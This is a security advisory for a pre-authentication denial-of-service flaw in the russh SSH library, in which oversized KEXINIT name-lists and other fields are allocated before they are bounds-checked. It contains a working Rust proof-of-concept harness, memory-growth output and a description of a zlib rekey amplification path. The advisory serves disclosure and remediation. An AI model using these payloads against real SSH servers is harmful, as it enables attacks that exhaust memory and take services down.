# [H] Russh SSH message fields were decoded through allocation-first parsers before field-specific bounds

## Summary
Severity: High
Advisory: GHSA-4r3c-5hpg-58qr
CVE: CVE-2026-48110
CWE: CWE-20
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-11
Source: https://github.com/advisories/GHSA-4r3c-5hpg-58qr
Type: github-advisory

## Affected
- crates.io: `russh` — affected >=0.34.0 <0.61.0

## Details
# SSH message fields were decoded through allocation-first parsers before field-specific bounds

### Summary

Several `russh` client and server message handlers decoded attacker-controlled SSH strings, name-lists, and byte fields into owned allocations before applying field-specific bounds. A remote SSH peer could send oversized, high-fanout, or malformed length-prefixed fields and make the library allocate, attempt to allocate, or split data before rejecting input that should have been rejected earlier.


### Affected Versions

Oldest verified exploitable stable release: `russh 0.34.0`.

- Historical stronger case: `russh >= 0.34.0, < 0.58.0`. These releases have the allocation-first KEXINIT field parsing issue and still use `CryptoVec` for inbound packet/decompression buffers. A peer can combine negotiated RFC `zlib`, rekey, compressed KEXINIT expansion, historical `CryptoVec` decompression growth, and KEXINIT name-list fanout.
- Current maintained-line case: `russh >= 0.58.0`, including `0.60.2`. These releases moved non-secret packet/decompression buffers off `CryptoVec`, but the allocation-first SSH field parser issue remains reachable as a `Vec`/`String`/name-list resource exhaustion issue.

 Prerelease coverage was not claimed for the zlib/`CryptoVec`/KEXINIT combo because the combined historical exploit shape was verified against stable `v0.34.0`-era code and reproduced the stress behavior on `v0.57.1`.

### Details

The affected parser pattern appeared across the SSH transport and encrypted-message parser code:

- KEX negotiation parsing
- client encrypted-message parsing
- server encrypted-message parsing
- shared SSH parsing helpers

Examples of allocation-first field parsing covered by the fix include:

- KEXINIT name-lists
- client `USERAUTH_FAILURE` method lists
- client `USERAUTH_BANNER` text fields
- client `USERAUTH_PK_OK` fields
- client `EXT_INFO` extension fields
- server `SERVICE_REQUEST` names
- server `USERAUTH_REQUEST` header fields
- server password/publickey/keyboard-interactive auth fields, excluding the already-submitted prompt-count issue
- server and client channel/global request names
- server pty, x11, env, exec, subsystem, signal, and forwarding request fields
- channel-open-failure description and language fields

Before the fix, these handlers generally used `ssh_encoding::Decode` into `String`, `Bytes`, `Vec`, or `NameList` first, then validated semantics later. For length-prefixed SSH fields, that means the owned decoder can accept an attacker-controlled length prefix and allocate or attempt allocation before discovering that the packet is truncated or above a local field bound. The fix introduces borrowed bounded parsing helpers such as `take_str`, `take_bytes`, and `take_name_list`.

### RFC / OpenSSH Comparison

RFC 4251 section 5 defines SSH `string` and `name-list` encodings. RFC 4253 and RFC 4254 then use those encodings throughout KEX, auth, channel, and forwarding messages. The RFC encoding permits large length prefixes, so implementations need local bounds appropriate to their packet and parser model.

RFC 4251 also says each name inside a `name-list` is non-empty, cannot contain a comma, and is made of US-ASCII names. RFC 4253 section 7.1 requires the algorithm name-lists in `SSH_MSG_KEXINIT` to contain at least one algorithm name, while language name-lists may be empty.

OpenSSH portable commonly parses SSH fields with packet-buffer helpers and then immediately checks message completion:

- `openssh-portable`: `kex.c`: `kex_input_kexinit()` / `kex_buf2prop()`
- `openssh-portable`: `auth2.c`: `USERAUTH_REQUEST` header parsing
- `openssh-portable`: `sshconnect2.c`: client auth reply parsing
- `openssh-portable`: `serverloop.c`: global and channel-open parsing
- `openssh-portable`: `session.c`: channel request parsing
- `openssh-portable`: `packet.c`: `sshpkt_get_cstring()`, `sshpkt_get_string()`, `sshpkt_get_end()`

`openssh-portable` was checked at `45b30e0a5`. OpenSSH generally gets its size safety from the already-bounded packet buffer and `sshbuf` helpers; it does not always avoid allocating a copied field. The `russh` patch is stricter in Rust-specific shape by using borrowed bounded helpers where practical, but the protocol alignment is the same: reject oversized or malformed name-lists/strings within a bounded packet parser.

### PoC

Inline availability stress PoC: an unauthenticated client sends concurrent `SSH_MSG_KEXINIT` payloads with a large but packet-sized first name-list containing many small algorithm names. This reaches the server-side initial key-exchange parser before user authentication and drives allocation-heavy owned decoding and name-list splitting. In a local direct-parser stress harness, 512 concurrent connection-equivalent parser workers parsing this payload eight times each raised process memory from about 4 MiB RSS to about 4.45 GiB RSS:

```text
threads=512
iterations_per_thread=8
total_iterations=4096
payload_bytes=262103
errors=0
elapsed_ms=5880
VmRSS: 4056 KiB -> 4661032 KiB
VmHWM: 4056 KiB -> 4674200 KiB
```

That concurrency level is material: the multi-GiB result required 512 simultaneous connection-equivalent parser contexts and about 1.02 GiB of total input across the run. The harness exercises the vulnerable pre-auth KEXINIT parser directly rather than opening real sockets, but the parsed bytes are ordinary SSH KEXINIT payload bytes reachable from a remote unauthenticated SSH peer.

Historical pre-`0.58.0` amplification note: before `0.58.0`, inbound packet and decompression buffers still used `CryptoVec`. To get the stronger historical growth, the peer must negotiate RFC `zlib` compression, complete the first key exchange, and then send a compressed rekey `SSH_MSG_KEXINIT` carrying the same high-fanout name-list shape. In a `v0.57.1` harness, a 652-byte compressed rekey KEXINIT inflated to a 600,103-byte KEXINIT payload, grew the historical `CryptoVec` decompression output, and then entered the same allocation-heavy KEXINIT name-list parser:

```text
threads=512
iterations_per_thread=2
total_iterations=1024
decompressed_payload_bytes=600103
compressed_payload_bytes=652
errors=0
elapsed_ms=5606
VmRSS: 5268 KiB -> 1464624 KiB
VmHWM: 5268 KiB -> 7014560 KiB
```

The constrained-memory result is useful because it shows where this becomes a service-killing failure rather than only elevated RSS. With the same historical code path, a roughly 1 KiB compressed rekey KEXINIT can force `CryptoVec` decompression growth into the parser fanout. Under an address-space limit, the process aborted on allocator failure while trying to satisfy one of the intermediate growth allocations:

```text
memory allocation of 262144 bytes failed
```

That historical result combines the field-parser issue in this report with the pre-`0.58.0` `CryptoVec` allocation/growth behavior. The important maintainer takeaway is the amplification shape: very small compressed rekey packets can create much larger historical `CryptoVec` buffers and then immediately feed the unbounded KEXINIT name-list parser. It is included here to explain historical severity and exploit shape; the separate CryptoVec advisory covers the underlying `CryptoVec` allocation/growth bug itself.

```rust
#[test]
fn stress_kexinit_many_names_many_connections() {
    use std::borrow::Cow;
    use std::sync::Arc;

    use byteorder::{BigEndian, ByteOrder};
    use ssh_key::Algorithm;

    use crate::negotiation::{Preferred, Select, Server};
    use crate::{cipher, compression, kex, mac, msg};

    fn no_crypto_preferred() -> Preferred {
        Preferred {
            kex: Cow::Owned(vec![kex::NONE]),
            key: Cow::Owned(vec![Algorithm::Ed25519]),
            cipher: Cow::Owned(vec![cipher::NONE]),
            mac: Cow::Owned(vec![mac::NONE]),
            compression: Cow::Owned(vec![compression::NONE]),
        }
    }

    fn encode_string(buf: &mut Vec<u8>, value: &[u8]) {
        let mut len = [0; 4];
        BigEndian::write_u32(&mut len, value.len() as u32);
        buf.extend_from_slice(&len);
        buf.extend_from_slice(value);
    }

    fn kexinit_with_kex_list(kex_list: &str) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.push(msg::KEXINIT);
        payload.extend_from_slice(&[0; 16]);
        encode_string(&mut payload, kex_list.as_bytes());
        encode_string(&mut payload, b"ssh-ed25519");
        encode_string(&mut payload, b"none");
        encode_string(&mut payload, b"none");
        encode_string(&mut payload, b"none");
        encode_string(&mut payload, b"none");
        encode_string(&mut payload, b"none");
        encode_string(&mut payload, b"none");
        encode_string(&mut payload, b"");
        encode_string(&mut payload, b"");
        payload.push(0);
        payload.extend_from_slice(&[0; 4]);
        payload
    }

    fn memory_status() -> (Option<usize>, Option<usize>) {
        let Ok(status) = std::fs::read_to_string("/proc/self/status") else {
            return (None, None);
        };
        let mut rss = None;
        let mut hwm = None;
        for line in status.lines() {
            if let Some(value) = line.strip_prefix("VmRSS:") {
                rss = value
                    .split_whitespace()
                    .next()
                    .and_then(|value| value.parse().ok());
            } else if let Some(value) = line.strip_prefix("VmHWM:") {
                hwm = value
                    .split_whitespace()
                    .next()
                    .and_then(|value| value.parse().ok());
            }
        }
        (rss, hwm)
    }

    const THREADS: usize = 512;
    const ITERATIONS_PER_THREAD: usize = 8;

    let payload = Arc::new(kexinit_with_kex_list(
        &("none,".to_owned() + &"a,".repeat(131_000) + "a"),
    ));
    let preferred = Arc::new(no_crypto_preferred());
    let barrier = Arc::new(std::sync::Barrier::new(THREADS + 1));
    let before = memory_status();
    let start = std::time::Instant::now();
    let mut threads = Vec::new();

    for _ in 0..THREADS {
        let payload = payload.clone();
        let preferred = preferred.clone();
        let barrier = barrier.clone();
        threads.push(std::thread::spawn(move || {
            barrier.wait();
            let mut errors = 0usize;
            for _ in 0..ITERATIONS_PER_THREAD {
                if Server::read_kex(&payload, &preferred, None, &kex::KexCause::Initial).is_err() {
                    errors += 1;
                }
            }
            errors
        }));
    }

    barrier.wait();
    let errors: usize = threads
        .into_iter()
        .map(|thread| thread.join().expect("thread"))
        .sum();
    let after = memory_status();

    eprintln!(
        "threads={THREADS} per_thread={ITERATIONS_PER_THREAD} total_iterations={} payload_bytes={} errors={errors} elapsed_ms={} memory_before={before:?} memory_after={after:?}",
        THREADS * ITERATIONS_PER_THREAD,
        payload.len(),
        start.elapsed().as_millis()
    );
}
```

On vulnerable code, this stress harness completed without parser errors and produced the multi-GiB RSS result above. With the fix applied, the same payload is rejected by `take_name_list()` against the local name-list bound before allocation-heavy parsing or name-list splitting.

I also checked a smaller regression form where the first KEXINIT name-list length prefix is `1_048_575` but the body is absent. On vulnerable code, that test is red with `Err(SshEncoding(Length))` instead of `Err(Error::PacketSize(_))`: the owned decoder has already accepted the attacker-controlled name-list length prefix and only fails after trying to read the absent body. With the fix applied, `take_name_list()` reads the length prefix, rejects it against the local maximum, and returns `PacketSize` before allocation-heavy parsing or name-list splitting.

The extreme `u32::MAX` length prefix was checked as a local, uncommitted experiment. In the current dependency set, `ssh_encoding` rejects that value as `Overflow` because its `usize` length decoder has an internal `1_048_575` byte cap. The smaller regression form therefore uses `1_048_575`, the maximum accepted prefix value, rather than keeping a 4 GiB allocation attempt in the test suite.

This demonstrates the highest-CVSS reachability for this class: a remote unauthenticated client reaches a server-side parser with a large SSH `name-list` during initial key exchange. That supports `AV:N/AC:L/PR:N/UI:N`.

 The `SERVICE_REQUEST` variant was checked after key exchange but before user authentication. It has the same allocation-first shape with a tiny packet containing only `SSH_MSG_SERVICE_REQUEST` plus a `1_048_575` length prefix, and the vulnerable code returns `Err(SshEncoding(Length))` rather than `PacketSize`. This is supporting evidence for the parser class, but the strongest availability evidence is the KEXINIT name-list fanout PoC above: 512 concurrent pre-auth parser contexts with 262,103-byte KEXINIT payloads drove process RSS from about 4 MiB to about 4.45 GiB.

### Impact

Suggested CVSS v3.1:

- `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Score: `7.5`

Reasoning:

- `AV:N`: reachable from a remote SSH peer
- `AC:L`: requires only attacker-controlled SSH fields with large or malformed length-prefixed values
- `PR:N`: some affected server-side paths are pre-authentication
- `UI:N`: no user interaction is required
- `C:N`, `I:N`: no confidentiality or integrity impact demonstrated
- `A:H`: 512 concurrent pre-auth KEXINIT parser contexts with large name-lists drove process RSS above 4 GiB in the direct parser harness, demonstrating a credible service-availability impact under high concurrency

Historical note for releases before `0.58.0`: the same high-fanout KEXINIT shape can be combined with negotiated RFC `zlib` and rekey to reduce wire cost dramatically and drive the old `CryptoVec` decompression output before the field parser runs. That supports keeping availability at `A:H` for the historical range as well, with an even stronger resource-amplification story. The demonstrated impact remains availability; no confidentiality, integrity, or RCE impact was demonstrated.

### Fix / Patch Direction

Use bounded borrowed parsing helpers for attacker-controlled SSH strings, byte fields, and name-lists before constructing owned values or invoking handlers.

The fix uses:

- `take_bytes`
- `take_str`
- `take_name_list`

## References
- https://github.com/Eugeny/russh/security/advisories/GHSA-4r3c-5hpg-58qr
- https://nvd.nist.gov/vuln/detail/CVE-2026-48110
- https://github.com/Eugeny/russh
- https://github.com/Eugeny/russh/releases/tag/v0.61.0
